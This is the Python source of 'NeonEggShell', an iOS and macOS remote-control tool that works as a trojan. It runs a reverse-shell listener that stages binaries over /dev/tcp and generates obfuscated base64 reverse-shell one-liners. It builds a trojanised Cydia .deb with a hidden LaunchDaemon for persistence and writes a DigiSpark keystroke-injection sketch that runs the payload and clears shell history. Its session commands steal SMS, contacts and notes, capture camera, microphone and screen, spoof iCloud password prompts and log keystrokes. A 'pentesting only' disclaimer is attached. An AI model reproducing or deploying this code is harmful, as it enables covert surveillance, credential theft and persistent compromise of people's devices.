#!/usr/bin/python
import base64,socket,sys,os,time,datetime,random,string,tarfile,os.path,platform
from subprocess import call
from sha import sha
from threading import Thread

cdir = os.getcwd()
eggemy = {} #class
eggsessions = {}
shouldclose=False
class Eggemy:
	def __init__(self,h,p):
		self.host = h
		self.port = p
		self.eflag = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(12))
		#self.eflag = "U61KXO9A5S2T"
		
	def listenforegg(self,verbose):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		s.bind(('0.0.0.0', int(self.port)))
		s.listen(1) 
		#generate random return key
		if verbose:
			strinfo("Starting Reverse Handler on "+str(self.port)+"...")
		conn, addr = s.accept() #wait to connect to a host
		if shouldclose:
			return False
		if verbose:
			strinfo("Connecting to "+addr[0])
		return self.bindegg(conn,self.host,self.port,self.eflag,s,verbose,addr[0])
	
	def bindegg(self,conn,host,port,eflag,s,verbose,address):
		port = str(port)
		conn.send("""
if [ -d /Applications/MobileSafari.app ]
then
	launchctl unload /Library/LaunchDaemons/.sysinfo.plist >/dev/null 2>&1
	echo ios >/dev/tcp/"""+host+"""/"""+port+""";
	if [ ! -f /usr/bin/base64 ]
	then
		cat </dev/tcp/"""+host+"""/"""+port+""" >/tmp/networcd;
		chmod +x /tmp/networcd;/tmp/networcd """+host+""" """+port+""" """+eflag+""";
		rm /tmp/networcd;
	else
		timeout 30s bash <<EOT
		cat </dev/tcp/"""+host+"""/"""+port+""" >/tmp/networcd;
		chmod +x /tmp/networcd;/tmp/networcd """+host+""" """+port+""" """+eflag+""";
		rm /tmp/networcd;
EOT
	fi
	launchctl load /Library/LaunchDaemons/.sysinfo.plist >/dev/null 2>&1
elif [ -d /Applications/Safari.app ]
then
	echo osx >/dev/tcp/"""+host+"""/"""+port+"""
	cat </dev/tcp/"""+host+"""/"""+port+""" >/tmp/networcd;chmod +x /tmp/networcd;
	/tmp/networcd """+host+""" """+port+""" """+eflag+""";rm /tmp/networcd;
fi
""");conn.close()
			
		#shitty shitty shitty shitty checker
		dtype=""
		while True:
			conn, addr = s.accept()
			if addr[0] == address:
				break
			else:
				conn.close()
		#RECIEVE device type
		dtype = conn.recv(8);
		conn.close()
		payloaddata=""
		if str("ios") in str(dtype):
			settings=2
			if verbose:
				strinfo("Device is iOS")
			payloaddata = open(cdir + "/esplios", "rb");
		elif str("osx") in str(dtype):
			settings=1
			if verbose:
				strinfo("Device is mac")
			payloaddata = open(cdir + "/esplosx", "rb")
		else:
			strinfo("Device Detection Failed")
		#SEND BINARY
		
		dtype=""
		while True:
			conn, addr = s.accept()
			if addr[0] == address:
				break
			else:
				conn.close()
				
		if verbose:
			strinfo("Sending stage...") #when we get a connection we will send the stage
		l = payloaddata.read(512)
		while (l):
			conn.send(l)
			l = payloaddata.read(512)
		payloaddata.close()
		conn.close()	
		#CONNECT TO BINARY
		conn, addr = s.accept() #last blink, accept the connect back connection from the payload running in the background in memory 
		data = conn.recv(512)
		#while not data: # While the input given is an empty string
		#	print "continue"
		#	conn, addr = s.accept() #last blink, accept the connect back connection from the payload running in the background in memory 
		#	data = conn.recv(128)
			#startserver(str(host),str(port))
		if data == "n":
			strinfo("user declined connection")
			exit()
		if data: #payload should return the name of the device and we will use that as our prompt
			name = data
			#spawn our interactive shell
			return {'nam':name, 'con':conn,'host':host,'port':port,'set':settings,'efl':eflag }
			#Eggemy(name,conn,s,settings,host,port,eflag)

#define colors :)
BG = '\033[3;32m'
UGREEN = '\033[4;92m'
GREEN = '\033[1;92m'
RED = '\033[1;91m'
UR = '\033[4;91m'
WHITE = '\033[0;97m'
INFO = '\033[0;36m'
WHITEBU = '\033[1;4m'
NES = '\033[4;32m'+"NES"+WHITE+"> "
ENDC = '\033[0m'

#banner menu
def banner():
	os.system('clear')
	print GREEN+base64.b64decode("PC0uIChgLScpXyAoYC0nKSAgXyAoYC0nKS4tPiAKICAgXCggT08pICkoIE9PKS4tLyAoIE9PKV8gICAKLC0tLi8gLC0tLygsLS0tLS0tLihfKS0tXF8pICAKfCAgIFwgfCAgfCB8ICAuLS0tJy8gICAgXyAvICAKfCAgLiAnfCAgfHx8ICAnLS0uIFxfLi5gLS0uICAKfCAgfFwgICAgfCB8ICAuLS0nIC4tLl8pICAgXCAKfCAgfCBcICAgfCB8ICBgLS0tLlwgICAgICAgLyAKYC0tJyAgYC0tJyBgLS0tLS0tJyBgLS0tLS0n")
	print WHITE + "     [Version 1.9.3]\n"+\
	RED + "  Created by NeonEggplant\n"+\
	WHITE+"\niOS/OSX System Remote Control\nCreate DEB, SHELL, and Arduino Payloads\n"+\
	WHITE + "http://neoneegplants.com\n"+\
	"-" * 45+"\n  NES Menu\n\
     1): Start server\n\
     2): Start multi server\n\
     3): Create Shell Script payload\n\
     4): Create Cydia Deb File payload\n\
     5): Create Arduino based payload\n\
     6): How to/About\n\
     7): Exit\n"+\
	 WHITE + "-" * 45


#main menu
def mainmenu(err):
	banner()
	host=getip();
	port=4444 #default port if one isnt set
	if err!=1 and err!="": #error message for invalid option
		print RED+"error: "+"\""+err+"\" is not a valid option"
	else:
		print
	option = raw_input(NES)
	#SELECT FROM MENU
	if option=="1":
		strinfo("Preparing Server")
		sethost = raw_input(NES+"SET LHOST (Leave blank for "+host+"):")
		if sethost!="":
			host = sethost
		strinfo("LHOST=>"+host)
		setport = raw_input(NES+"SET LPORT (Leave blank for "+str(port)+"):")
		if setport!="":
			port=setport
		strinfo("LPORT=>"+str(port))
		startserver(str(host),str(port))
	elif option=="2":
		strinfo("Preparing Multi Server")
		sethost = raw_input(NES+"SET LHOST (Leave blank for "+host+"):")
		if sethost!="":
			host = sethost
		strinfo("LHOST=>"+host)
		setport = raw_input(NES+"SET LPORT (Leave blank for "+str(port)+"):")
		if setport!="":
			port=setport
		strinfo("LPORT=>"+str(port))
		bgserver = Thread(target = multiserver, args=(host,port,))
		bgserver.daemon=True
		bgserver.start()
		time.sleep(0.01)
		multiservercontroller(port)
		bgserver.join()
	elif option=="3":
		strinfo("Preparing Shell Script")
		sethost = raw_input(NES+"SET LHOST (Leave blank for "+host+"):")
		if sethost!="":
			host = sethost
		strinfo("LHOST=>"+host)
		setport = raw_input(NES+"SET LPORT (Leave blank for "+str(port)+"):")
		if setport!="":
			port=setport
		strinfo("LPORT=>"+str(port))
		setpersistent = raw_input(NES+"Make it a background job? (reconnect after exit)(y/N):")
		if str(setpersistent).lower()=="y":
			setpersistent = True
		else:
			setpersistent = False
		strinfo("background=>"+str(setpersistent))
		createshellscript(str(host),str(port),setpersistent)
	elif option=="4":
		strinfo("Preparing Deb File")
		sethost = raw_input(NES+"SET LHOST (Leave blank for "+host+"):")
		if sethost!="":
			host = sethost
		strinfo("LHOST=>"+host)
		setport = raw_input(NES+"SET LPORT (Leave blank for "+str(port)+"):")
		if setport!="":
			port=setport
		strinfo("LPORT=>"+str(port))
		createdebfile(str(host),str(port))
	elif option=="5":
		strinfo("Please Select a Device\n\n     1): Arduino/Teensy\n     2): DigiSpark\n")
		option = raw_input(NES + "device: ")
		sethost = raw_input(NES+"SET LHOST (Leave blank for "+host+"):")
		if sethost!="":
			host = sethost
		strinfo("LHOST=>"+host)
		setport = raw_input(NES+"SET LPORT (Leave blank for "+str(port)+"):")
		if setport!="":
			port=setport
		strinfo("LPORT=>"+str(port))
		setpersistent = raw_input(NES+"Make it a background job? (reconnect after exit)(y/N):")
		if str(setpersistent).lower()=="y":
			setpersistent = True
		else:
			setpersistent = False
		strinfo("background=>"+str(setpersistent))
		createino(option,str(host),str(port),setpersistent)
		startserverprompt(host,port)
	elif option=="6":
		about()
	elif (option=="7") or (option=="exit"):
		print ENDC
		os.system("clear")
		exit()
	else:
		mainmenu(option)
	mainmenu(1)

#start the server 
def startserver(host,port):
	eggemy[1] = Eggemy(host,port)
	egg = eggemy[1].listenforegg(True)
	#define our socket
	interactiveshell(egg['nam'],egg['con'],egg['set'],egg['host'],egg['port'],egg['efl'],False)
	mainmenu(1)

def multiserver(host,port):
	global eggsessions
	x = 1
	strinfo("Starting Background Multi Server on "+str(port)+"...")	
	print "type \"help\" for MultiServer commands"
	while(1):
		eggemy[x] = Eggemy(host,port)
		egg = eggemy[x].listenforegg(False)
		if not egg:
			break
		eggsessions[x] = egg
		sys.stdout.write("\n\r"+INFO+"[*]  "+WHITE+"Session "+str(x)+" opened")
		sys.stdout.flush()
		x+=1
		
def multiservercontroller(port):
	global eggsessions
	while(1):
		cmd = raw_input(WHITE+""+UR+"MultiServer"+WHITE+"> ")
		if cmd != "":
			if cmd.split()[0] == "interact":
				if len(cmd.split()) >= 2:
					try:
						sn = int(cmd.split()[1])
					except:
						sn = -1
					if sn in eggsessions:
						egg = eggsessions[sn]
						interactiveshell(egg['nam'],egg['con'],egg['set'],egg['host'],egg['port'],egg['efl'],True)
					else:
						print "invalid session"
				else:
					print "Usage: interact (session number)"
			elif cmd == "sessions":
				x = 0
				if len(eggsessions) == 0:
					print "No active sessions"
				else:
					print " "+WHITEBU+"Active Sessions"+WHITE
				while x < len(eggsessions):
					x+=1
					egg = eggsessions[x]
					print "   "+str(x)+". "+egg['nam']
			elif cmd == "help":
				print "\n "+WHITE+ WHITEBU + "MultiServer Commands\n" + WHITE
				print " sessions    - show current sessions"
				print " interact    - interact with a session. Usage: interact (session number)"
				print " back        - go back to the multisession controller from a session"
				print " exit        - go back to the main menu"
				print " clear       - clear screen\n"
			elif cmd == "clear":
				os.system('clear')
			elif cmd == "exit":
				#SEND SHUTDOWN COMMAND TO OUR THREAD
				global shouldclose
				shouldclose = True
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect(("127.0.0.1", port));s.send(".")
				shouldclose = False
				x = 0
				while x < len(eggsessions):
					x+=1
					egg = eggsessions[x]
					strinfo("closing session "+str(x))
					egg['con'].close()
					type(eggsessions)
				eggsessions = {}
				break
				#close any open sessions
				
#interactive shell
def interactiveshell(name,conn,settings,host,port,eflag,ismulti):	
	#begin interactive shell
	strinfo("NES Session Started")
	print "type \"help\" for commands"
	name = UGREEN + name.replace("\n","")+ENDC+GREEN+"> "+ENDC
	while 1:
		option=0
		cmd = raw_input(name);
		if cmd:
			#mac
			if settings == 1:
				if cmd.split()[0]=="screenshot":
					option=2
				elif cmd.split()[0]=="camshot":
					option=3
				elif cmd.split()[0]=="imessage":
					address = base64.b64encode(raw_input("recipient: "))
					message = base64.b64encode(raw_input("message: ").replace('"','\"'))
					cmd = cmd + " " + address + " " + message
				elif cmd.split()[0] == "mic":
					if len(cmd.split()) == 2:
						if cmd.split()[1] == "stop":
							date_string = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
							file="mic-"+date_string+".caf"
							conn.send(base64.b64encode(cmd) + "\n")
							stat = conn.recv(1)
							if stat == "y":
								fsize = conn.recv(16)
								fsize = int(fsize) + 12;
								tmpdata=""
								while 1:
									slick = conn.recv(65536)
									tmpdata = tmpdata + slick
									sys.stdout.write("\r"+INFO+"[*]  "+WHITE+"Downloading "+file+" ("+str(len(tmpdata))+"/"+str(fsize)+") bytes")
									sys.stdout.flush()
									if eflag in tmpdata:
										tmpdata = tmpdata.replace(eflag,"")
										with open(file,"wb") as f:
											f.write( base64.b64decode(tmpdata))#write all our data to file
										print
										strinfo("Done!")						
										break
							else:
								strinfo("ERROR: Mic isn't running")
							continue
			#ios
			elif settings == 2:					
				if cmd=="alert":
					title = raw_input("alert title: ")
					title = base64.b64encode(title)
					message = raw_input("alert message: ")
					message = base64.b64encode(message)
					cmd = cmd + " " + title + " " + message
				elif cmd.split()[0]=="screenshot":
					print "Activating screenshotter..."
				elif cmd.split()[0]=="install":
					if len(cmd.split()) == 2:
						if cmd.split()[1]=="persistence":
							delay = ""
							while not delay: # While the input given is an empty string
								delay = raw_input(NES+"SET RECONNECT DELAY (Leave blank for 30, minimum 5): ")
								if delay:
									if int(delay) < 5:
										print "must be at least 5"
										delay = ""
								else:
									delay = "30"
								cmd = cmd.split()[0]+" "+cmd.split()[1]+" "+delay
						elif cmd.split()[1]=="nespro":
							dylib = cdir + "/nespro.dylib"
							if os.path.isfile(dylib) != True:
								strinfo("nespro.dylib not found")
								print "If you already have NESPRO make sure its in the current directory"
								continue
							conn.send(base64.b64encode(cmd) + "\n")
							if str(conn.recv(1)) == "y":
								print "[*]  nespro is already installed"					
							else:
								print "[*]  uploading dylib"
								f = open(dylib,mode='rb')
								fdata = base64.b64encode(f.read())
								conn.send(str(len(fdata)) + "\n")
								time.sleep(0.5)
								conn.send(str(fdata) + "\n")
								print conn.recv(48)
							continue
						else:
							strinfo("addon not available")
							continue
				elif cmd.split()[0]=="frontcam":
					print "activating front camera..."
					option=4;
				elif cmd.split()[0]=="backcam":
					print "activating back camera..."
					option=5;
				elif cmd.split()[0]=="getsms":
					cmd="download /var/mobile/Library/SMS/sms.db"
					recvfile(cmd,conn,eflag)
					continue
				elif cmd.split()[0]=="getaddbook":
					cmd="download /var/mobile/Library/AddressBook/AddressBook.sqlitedb"
					recvfile(cmd,conn,eflag)
					continue
				elif cmd.split()[0]=="getnotes":
					cmd="download /var/mobile/Library/Notes/notes.sqlite"
					recvfile(cmd,conn,eflag)
					continue
				
			#universal
			if cmd.split()[0] == "lls":
				if len(cmd.split()) == 1:
					os.system('ls')
				else:
					os.system('ls ' + cmd.replace("lls ",""))
				continue
			elif cmd.split()[0] == "lopen":
				if len(cmd.split()) == 1:
					print "lopen - missing argument"+BG
				else:
					os.system('open ' + cmd.replace("lopen ",""))
				continue
			elif cmd.split()[0]=="download":
				if len(cmd.split()) >= 2:
					recvfile(cmd,conn,eflag)
					continue
			elif cmd.split()[0]=="upload":
					if len(cmd.split()) == 2:
						fname = cmd.split()[1]
						f = open(fname)
						fdata = f.read()
						filelen = len(base64.b64encode(fdata))
						conn.send(base64.b64encode("upload") + "\n")
						conn.send(str(fname) + "\n")
						conn.send(str(filelen) + "\n")
						conn.send(base64.b64encode(fdata) + "\n")
			elif cmd == "lpwd":
				print os.getcwd()
				continue
			elif cmd.split()[0] == "lcd":
				os.chdir(cmd.split()[1])
				continue
			elif cmd=="clear":
				os.system('clear')
				continue
			elif cmd=="prompt":
				print "Opening password prompt on device..."
				conn.settimeout(3600)
			elif cmd=="back":
				if ismulti:
					strinfo("sending session to background")
					time.sleep(0.3)
					break
			elif cmd=="exit":
				strinfo("closing connection")
				conn.send(base64.b64encode("exit") + "\n")
				time.sleep(0.3)
				break
			elif cmd == "help":
				time.sleep(0.2)
				showhelp(settings)
				continue
		else:
			cmd="null"
		getdata(cmd,option,conn,eflag)	
		
def recvfile(cmd,conn,eflag):
	file=cmd.split()[1]
	if "/" in file: #save file as the last array of characters after / if file is in another directory
		file=file.split('/')[-1]
	conn.send(base64.b64encode(cmd) + "\n")
	if conn.recv(1) == "y":
		fsize = conn.recv(16)
		fsize = int(fsize) + 12;
		tmpdata=""
		while 1:
			slick = conn.recv(8192)
			tmpdata = tmpdata + slick
			sys.stdout.write("\r"+INFO+"[*]  "+WHITE+"Downloading "+file+" ("+str(len(tmpdata))+"/"+str(fsize)+") bytes")
			sys.stdout.flush()
			if eflag in tmpdata:
				tmpdata = tmpdata.replace(eflag,"")
				
				with open(file,"wb") as f:
					f.write( base64.b64decode(tmpdata))#write all our data to file
				print
				strinfo("Done!")						
				break
	else:
		strinfo("ERROR: file not found")

#send command to the device then recieve data 
def getdata(cmd,option,conn,eflag):
		conn.send(base64.b64encode(cmd) + "\n") #send cmd
		appendeddata=""
		while 1: #get all data
			data = conn.recv(1024)
			appendeddata = appendeddata + data
			if eflag in data:
				#replace junk
				appendeddata = appendeddata.replace(eflag,"")
				if appendeddata == "":
					break
				if option==2:
					if "cycript" in appendeddata:
						print appendeddata
					else:
						appendeddata = find_between( appendeddata, "EOFSTART", "EOFEND" )
						date_string = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
						filename="screenshot-"+date_string+".tiff"
						with open(filename,"wb") as f:#create file
							f.write(base64.b64decode(appendeddata))#write to file
							print "saving to "+filename
				elif option==3:
					appendeddata = find_between( appendeddata, "EOFSTART", "EOFEND" )
					date_string = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
					filename="isight-"+date_string+".jpg"
					with open(filename,"wb") as f:#create file
						f.write(base64.b64decode(appendeddata))#write to file
						print "saving to "+filename
				elif (option==4) or (option==5):
					savecamera(option,find_between( appendeddata, "EOFSTART", "EOFEND" ))
				else:
					#REGULAR RETURN DATA, NO SAVING FILES
					appendeddata = appendeddata.splitlines()
					for x in range(0,len(appendeddata)):
						if not "CoreFoundation = " in appendeddata[x]:
							print appendeddata[x];
						x += 1
				break;

#gets our current ip
def getip():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);s.connect(("192.168.1.1",80));host = s.getsockname()[0];s.close()
	return host
	
#prompt user if they want to start the server
def startserverprompt(host,port):
	listenop = raw_input(NES+"Start Server? (Y/n): ")
	if listenop == "n":
		mainmenu(1)
	startserver(str(host),str(port))
	
#GENERATE BASE64 PAYLOAD
def createshellscript(host,port,ispersistent):
	payload=''
	if ispersistent:
		payload=base64.b64encode("while true; do cat </dev/tcp/"+host+"/"+port+" | sh; sleep 5; done & exit")
	else:
		payload=base64.b64encode("cat </dev/tcp/"+host+"/"+port+" | sh & exit")
	strinfo("Creating Payload...")
	
	print INFO + "echo "+payload+" | base64 --decode | bash >/dev/null 2>&1"+ENDC
	startserverprompt(host,int(port))
	
#createArduino .ino file
def createino(option,host,port,ispersistent):
	if int(option) == 1:
		print "not supported yet"
		exit()
	elif int(option) == 2:
		payload=''
		if ispersistent:
			payload=base64.b64encode("while true; do cat </dev/tcp/"+host+"/"+port+" | sh; sleep 5; done & exit")
		else:
			payload=base64.b64encode("cat </dev/tcp/"+str(host)+"/"+str(port)+" | sh & exit")
		payload = "echo "+payload+" | base64 --decode | bash >/dev/null 2>&1"
	
		strinfo("writing to arduino/digispark_injector.ino")
		time.sleep(0.2)		
		if not os.path.isdir("arduino"):
			os.makedirs("arduino")
		with open("arduino/digispark_injector.ino","w") as f:
			f.write("""//Created with NeonEggShell by neoneggplant
#include <DigiKeyboard.h>
const int pin = 1;//default onboard led pin
void setup() {
  pinMode(1,OUTPUT); //we are going to control this pin
  DigiKeyboard.sendKeyStroke(KEY_W, MOD_GUI_LEFT);//bypass "Keyboard Setup" prompt
  delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);//open spotlight
  delay(500);
  DigiKeyboard.println("Terminal");//open terminal
  delay(4000);  
  DigiKeyboard.println("""+"\""+payload+""";history -wc;killall Terminal;"); //execute payload, clear history, close terminal
}
void loop() {
  //blink when done
  digitalWrite(1,HIGH);
  delay(200);
  digitalWrite(1,LOW);
  delay(200);
}
""")

#our launchdaemon
launchd="""echo \"\"\"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
	<dict>
		<key>Label</key>
		<string>com.example.app</string>
		<key>Program</key>
		<string>/usr/bin/.sys</string>
		<key>RunAtLoad</key>
		<true/>
	</dict>
</plist>\"\"\" >/Library/LaunchDaemons/.sysinfo.plist;chmod +x /usr/bin/.sys;chmod 644 /Library/LaunchDaemons/.sysinfo.plist;launchctl unload /Library/LaunchDaemons/.sysinfo.plist >/dev/null 2>&1;launchctl load /Library/LaunchDaemons/.sysinfo.plist
"""

def make_tarfile(output_filename, source_dir):
    with tarfile.open(output_filename, "w:gz") as tar:
        tar.add(source_dir, arcname=os.path.basename(source_dir))
        
#create deb file, must have dpkg installed
def createdebfile(host,port):
	strinfo("[*]  " + WHITE + "Begin control file setup")
	nme = '';pkg = '';vrsn = '';descrip = '';mntner = '';auth = '';sectn = ''
	while not nme: # While the input given is an empty string
		nme=raw_input(NES+'Name: '+WHITE)
	while not pkg: # While the input given is an empty string
		pkg=raw_input(NES+'Package: '+WHITE)
		pkg=pkg.replace(' ',"-")
	while not vrsn: # While the input given is an empty string
		vrsn=raw_input(NES+'Version: '+WHITE)
	while not descrip:
		descrip=raw_input(NES+'Description: '+WHITE)
	while not sectn:
		sectn=raw_input(NES+'Section: '+WHITE)
	while not mntner:
		mntner=raw_input(NES+'Maintainer: '+WHITE)
	while not auth:
		auth=raw_input(NES+'Author: '+WHITE)
	strinfo("Name => "+nme)
	strinfo("Package => "+pkg)
	strinfo("Version => "+vrsn)
	strinfo("Section => "+sectn)
	strinfo("Description => "+descrip)
	strinfo("Maintainer => "+mntner)
	strinfo("Author => "+auth)
	time.sleep(0.5)
	strinfo("Preparing Files")
	time.sleep(0.5)
	
	#create deb
	os.makedirs(nme);os.chdir(nme)
	os.makedirs("DEBIAN")
	os.chdir("DEBIAN")
	#WRITE CONTROL FILE
	file = open('control', 'w+')
	file.write(\
	"Package: "+pkg+"\n"+\
	"Name: "+nme+"\n"+\
	"Version: "+vrsn+"\n"+\
	"Architecture: iphoneos-arm\n"+\
	"Description: "+descrip+"\n"+\
	"Section: "+sectn+"\n"+\
	"Maintainer: "+mntner+"\n"+\
	"Author: "+auth+"\n"\
	)
	file.close()
	#WRITE POSTINST FILE
	file = open('postinst', 'w+')
	pload="cat </dev/tcp/"+host+"/"+port+" | sh & exit"
	pload="echo '#!/bin/bash\n"+pload+"'>/usr/bin/.sys;"
	file.write(\
	"#!/bin/bash\n"+\
	pload+launchd\
	)
	file.close()
	#SET PERMISSIONS
	os.chmod('postinst', 0755)
	os.chdir("../..")
	file = open('debian-binary', 'w+');file.write("2.0\n");file.close()
	os.system("dpkg -b "+nme+" "+nme+".deb >/dev/null 2>&1")	
	startserverprompt(host,port)	

#save base64 data to image file from camera (front/back)
def savecamera(fb,data):
	date_string = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
	filename=""
	if fb==4:
		filename="camera_front_ios-"+date_string+".jpg"
	elif fb==5:
		filename="camera_back_ios-"+date_string+".jpg"
	with open(filename,"wb") as f:#create file
		f.write(base64.b64decode(data))#write to file
		print "saving to "+filename

#simple function that gets text between two strings
def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""
        
#show commands
def showhelp(settings):
	print "\n "+WHITE+ WHITEBU + "NES Commands\n" + WHITE
	print " download    - usage: download file.jpg"
	print " sysinfo     - get current machine user and name"
	print " ip          - view active ip"
	if settings == 1:
		#OSX NES Specials 
		print " itstatus    - iTunes status "
		print " play        - iTunes play "
		print " pause       - iTunes pause "
		print " next        - iTunes next track"
		print " prev        - iTunes previous track"
		print " setvol      - set device volume"
		print " getvol      - get device volume"
		print " idletime    - last time device was interacted with"
		print " screenshot  - take screenshot"
		print " camshot     - take picture with isight camera"
		print " mic         - record audio with the microphone "
		print " prompt      - password prompt spoof"
		print " brightness  - set screen brightness"
		print " getpaste    - get string from clipboard\n"
	elif settings == 2:
		#IOS NES Specials 
		print " flash       - turn on flash for -t (seconds)"
		print " say         - say command"
		print " vibrate     - vibrate device"
		print " alert       - display an alert"
		print " setvol      - media control set volume"
		print " getvol      - media control get volume"
		print " isplaying   - media control is playing?"
		print " prompt      - spoof icloud password prompt"
		print " frontcam    - take photo with front camera"
		print " backcam     - take photo with back/rear camera"
		print " getlocation - retrieve gps coordinates if locationservices are enabled"
		print " getpower    - retrieve battery life"
		print " getsms      - download the sms database"
		print " getaddbook  - download the addressbook database"
		print " getnotes    - download the notes database"
		print " getpaste    - get PasteBoard contents (only works if device is unlocked)"
		print " install     - install addons"
		print " uninstall   - uninstall addons"
		print "\n " + WHITEBU + "NESPRO Commands\n" + WHITE
		print " play        - media control play"
		print " pause       - media control pause"
		print " prev        - media control previous track"
		print " next        - media control next track"
		#print " screenshot  - take and save screenshot" #ill eventually get around to this
		print " wake        - wake device"
		print " lock        - simulate lock button"
		print " home        - simulate home button"
		print " doublehome  - simulate doublepress home button"
		print " tmute       - toggle mute"
		#print " lastapp     - retrieve last app opened"
		print " islocked    - check if device is currently locked with passcode"
		print " trypass     - try to unlock device with passcode"
		print " openurl     - open url in safari"
		print " dial        - dial phone number"
		print " undisabled  - remove disabled device state after failed passcode attempts"
		print " locationon  - turn on location services"
		print " locationoff - turn off location services"
		print " keylogger   - log keystrokes and passwords on the springboard and sandboxed apps "
		print "\n " + WHITEBU + "Addons"+WHITE+" (Use \"install\")\n"
		print " persistence - device will try to connect after session is closed, even after a reboot"
		print " nespro      - install whole new set of commands"
	print "\n " + WHITEBU + "Local Commands\n" + WHITE
	print " clear       - clears the console"
	print " lls         - perform a local directory listing"
	print " lcd         - perform a local directory change"
	print " lpwd        - show current directory"
	print " lopen       - locally run the command open"
	print " exit        - cleans up and exits eggshell\n"

def strinfo(this):
	print INFO+"[*]  " + WHITE + this

#show about screen
def about():
	os.system("clear")
	print INFO+"""   .--.  ,---.    .---.  .-. .-. _______ 
 / /\ \ | .-.\  / .-. ) | | | ||__   __|
/ /__\ \| |-' \ | | |(_)| | | |  )| |   
|  __  || |--. \| | | | | | | | (_) |   
| |  |)|| |`-' /\ `-' / | `-')|   | |   
|_|  (_)/( `--'  )---'  `---(_)   `-'   
       (__)     (_)                     
		"""
	print RED + "Created by NeonEggplant" + WHITE +\
	"""
NES is an iOS and OSX command shell creation tool written in python
This tool creates an command line session with extra functionality like
downloading files, taking pictures, and gathering  data  on  a  target.  
To run neoneggshell, first create a payload (shellscript or deb  file).
The payload should then be executed on the target device that you  want
to control. 

This tool is for pentesting only, not for controlling peoples devices"""+RED+"""

    [Target]                    """+INFO+"--->                  """+GREEN+"[NES Server(you)]"+WHITE+"""
  runs payload       """+INFO+"payload points to server ip"+WHITE+"""     listens for target
execute commands              """+INFO+" <---"+WHITE+"""                     send commands\n
		"""
	raw_input(INFO+"PRESS ENTER TO RETURN TO MENU"+ENDC)
  	mainmenu(1)


def showagreement():
	print GREEN+"""\
Copyright 2015, NeonEggShell (NES) by NeonEggplant
All rights reserved.
"""+WHITE+"""
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
"""+RED+"""
NeonEggShell is created for lawful purposes only. If you are planning on using this tool for malicious purposes that are not authorized by the company you are performing assessments for, you are violating the terms of service and license of this toolset. By choosing yes, you agree to the terms of service and that you will only use this tool for lawful purposes only.
"""

#Start NES
if sys.version_info < (2, 7):
		raise "python >= 2.7 is required"
		

if not os.path.exists("/usr/local/share/NES/agree"):
	os.system("clear")
	
	if not os.path.exists("/usr/local/share/NES/agree"):
		if not os.path.exists("/usr/local/share/NES/"):
			os.makedirs("/usr/local/share/NES/")
		showagreement()
		if raw_input(WHITE+"Do you accept [y/n]:"+ENDC) == "y":
			os.system("touch /usr/local/share/NES/agree")
		else:
			exit()

mainmenu(1)
